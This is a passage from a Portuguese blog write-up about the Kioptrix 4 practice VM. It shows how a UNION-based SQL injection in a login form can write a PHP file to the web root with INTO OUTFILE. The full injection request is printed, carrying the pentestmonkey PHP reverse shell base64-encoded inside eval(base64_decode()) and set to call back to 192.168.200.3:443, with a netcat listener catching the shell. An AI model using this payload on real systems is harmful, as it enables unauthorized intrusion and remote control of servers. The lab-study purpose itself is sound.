que agora eu n√£o quero nada que venha do select (limit 0,0) e com esse nada eu fa√ßo uma uni√£o para os campos que eu quero, ou seja, eu mesclo nada com o texto que eu quero que v√° parar no arquivo. ;D</span></span></p></div><div id="https://www.notion.so/aa5b6e819c3c4eacbd026c0137429a1a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/36c66d2e5d8844219501e77ce504aa8d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Voc√™s podem se perguntar ? Porque tr√™s campos e n√£o dois ou um, ou dez, ou duzentos ? Quando voc√™ faz uma uni√£o de tabelas (tabela que o sistema ta consultando nesse select mas a nossa &quot;tabela&quot; de , nesse caso, 3 campos) a quantidade de campos tem que ser exatas! E ainda, dependendo da vers√£o do MySQL, pelo que me contaram, de tipo igual. Ent√£o, para o nosso caso exemplo, no kioptrix 4, s√£o 3 campos.</span></span></p></div><div id="https://www.notion.so/c2cb732d4acf45599368444cd7597d23" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/030fec26a82c4ddbb6eaaa8bdc85dac9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E eu preciso dividir o c√≥digo em tr√™s campos ? Rapaz, precisa n√£o. voc√™ pode colocar nada em um, tudo no meio, nada no final, ou nada, nada e tudo, e por ai vai.</span></span></p></div><div id="https://www.notion.so/eb6c11035bcc457eaf740d5ea88d447c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2dad15cfa46e45f1b906ea2a02879dc9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Mas bem, viu que preciso colocar o c√≥digo php dentro de um destes campos que √© delimitado por aspas duplas, correto ? Poderia ser simples ? poderia, tanto faz. Se pegarmos o c√≥digo do web shell do pentest monkey, olha s√≥:</span></span></p></div><div id="https://www.notion.so/604a918d57724c56ae2b4fa2ab26613e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f89502187cc44a5bb7d7a7b0ccd277b7" class="Image Image--PageWidth"><figure><a href="#?width=700"><img src="#?width=700" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/a47e291be13f4a9baf5add7bf1ee726b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Teria que modificar o c√≥digo todo para tentar deixar s√≥ um tipo de aspas, fazer escape onde n√£o puder, remover espa√ßos e quebras de linha para ficar como se fosse uma linha √∫nica, para no final, colocar tudo dentro de um dos campos.</span></span></p></div><div id="https://www.notion.so/bca7063788ca4f9189a33bf11c0e738f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c1769b0b86a648c6a3025726cf223385" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Dureza. Masss podemos transformar todo esse c√≥digo em base64 e usar as fun√ß√µes eval() e base64_decode() do php, para &quot;descriptografar&quot; o c√≥digo e execut√°-lo on-the-fly ;D Marromenos assim:</span></span></p></div><div id="https://www.notion.so/bc5e3beaf60f4a10b16f791f8ce79fca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/9f29b01b31b546bba37c998fdc72a4e2" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;codigo em base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></span></span></span></code></pre><div id="https://www.notion.so/aa6b40dc3a154fd19a4227f7b1cfff2e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/31b7cf94fdc04ee8bf72cdc6573a4acc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Por exig√™ncia da fun√ß√£o eval, temos que elimiar o &lt;?php do in√≠cio e o ?&gt; do final do script.</span></span></p></div><div id="https://www.notion.so/0f5ac83429ff40788002f9f4c470a9db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/419cd41f3cb1471b9fe781d2eb6548b7" class="Image Image--PageWidth"><figure><a href="#?width=679"><img src="#?width=679" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/61a9556356f842e2b38f1f6d2b992959" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a26383ab475045eea28aa467a42d54f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Depois √© s√≥ usar o comando base64 e salvar o c√≥digo gerado em algum lugar para usar na nossa instru√ß√£o</span></span></p></div><pre id="https://www.notion.so/3bb7be088dca45deb64e64b46a821db8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># cat meu-lindo-shell.php | base64 -w</span></span></span></code></pre><div id="https://www.notion.so/38da02329769401b893febec00497fe7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e3e1d11c4eca43f7b96253d35bd98ce4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora precisamos s√≥ juntar o SQL que iremos passar, com o c√≥digo php que descriptografa e executa e o shell em base64, ficando assim :</span></span></p></div><div id="https://www.notion.so/3365651746014a6584a7944c5a71d9c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/5baa5d75ceb443959ab9d0603cc26cb3" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>myusername<span class="token operator">=</span>john<span class="token operator">&amp;</span>mypassword<span class="token operator">=</span><span class="token operator">-</span><span class="token number">9334</span>' <span class="token keyword">OR</span> <span class="token number">1908</span><span class="token operator">=</span><span class="token number">1908</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span> union all select "</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgBlue"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span></span></span></mark></span><span class="SemanticString"><span><span class="token double-quoted-string string">" , "</span></span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgBlue"><span><span class="token single-quoted-string string">'c2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnMTkyLjE2OC4yMDAuMyc7ICAvLyBDSEFOR0UgVEhJUwokcG9ydCA9IDQ0MzsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCQoJaWYgKCRwaWQgPT0gLTEpIHsKCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwoJCWV4aXQoMSk7Cgl9CgkKCWlmICgkcGlkKSB7CgkJZXhpdCgwKTsgIC8vIFBhcmVudCBleGl0cwoJfQoKCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgewoJCXByaW50aXQoIkVycm9yOiBDYW4ndCBzZXRzaWQoKSIpOwoJCWV4aXQoMSk7Cgl9CgoJJGRhZW1vbiA9IDE7Cn0gZWxzZSB7CglwcmludGl0KCJXQVJOSU5HOiBGYWlsZWQgdG8gZGFlbW9uaXNlLiAgVGhpcyBpcyBxdWl0ZSBjb21tb24gYW5kIG5vdCBmYXRhbC4iKTsKfQoKY2hkaXIoIi8iKTsKCnVtYXNrKDApOwoKCiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CgokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0='</span></span></mark></span><span class="SemanticString"><span><span class="token double-quoted-string string">" , "</span></span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedBg SemanticString__Fragment--BgBlue"><span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></mark></span><span class="SemanticString"><span>" <span class="token constant">INTO</span> <span class="token constant">OUTFILE</span> <span class="token single-quoted-string string">'/var/www/meu-lindo-shell.php'</span><span class="token operator">--</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span></span></span></span></code></pre><div id="https://www.notion.so/f1e884a64e424d01a9c22480af9021fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ad30c500ee0e48aabc30c59545bbcc4b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">E ai , mandando pelo Burp , Colocando o nc para escutar, acessando o aquiro via browser, vmaos parar no mesmo lugar: </span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Shell no Net Gatinho</strong></em></span><span class="SemanticString"> ! ;D</span></span></p></div><div id="https://www.notion.so/d656c313db9247139c0a6c443ea3ecf7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ec7541eef08f4c70b544c6529e30b39d" class="Image Image--PageWidth"><figure><a href="#?width=660"><img src="#?width=660" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3ee99e68c95a46b39dd2f566399806cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fdeb4983a9ae4fff9b80eb272c14a6a7" class="Image Image--PageWidth"><figure><a href="#?width=700"><img src="#?width=700" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2af6d846ca4c48678580652e1dfa70e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><blockquote id="https://www.notion.so/f207ef861318478c82185e40ddbd36fb" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">Ahhh, mas eu queria era com hexadecimal!</span></span></blockquote><div id="https://www.notion.so/c1a2adf7062d4d2caf87c5eae3642ddc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f39fdc4d09de48f1a6037dac4abc8441" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Massa, d√° pra fazer tamb√©m. Usa o Cyberchef em vez do base64 ou qualquer outra forma que voc√™ conhecer, converte para Hexa tudo e depois usa em vez da fun√ß√£o </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">base64_decode() </strong></span><span class="SemanticString">a fun√ß√£o </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">hex2bin()</strong></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/87b3a18e4c35445ca3868f0bcaa6b23b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c1dabadc8df445cb9110c42724bc3310" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ah, olha que interessante desta m√°quina:</span></span></p></div><div id="https://www.notion.so/12698f1aff89414abd83ba684ccc992f" class="Image Image--PageWidth"><figure><a href="#?width=698"><img src="#?width=698" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/34d585275c71483fa35b65a6c7377d11" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/06e8f25934dd408388e437bfc9b0be00" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O arquivo que subimos o usu√°rio dele √© root e o grupo root. </span></span></p></div><div id="https://www.notion.so/30f0fdc3f4c94044aa9ee0b001e6846d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ba6591bdbc524587a209f4b6f307d670" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At√©.</span></span></p></div></article>  <footer class="Footer">
        <div>&copy; inDex 2019</div>
        <div>&centerdot;</div>
        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
            rel="noopener noreferrer">Notablog</a>.
        </div>
    </footer>
</body>

</html>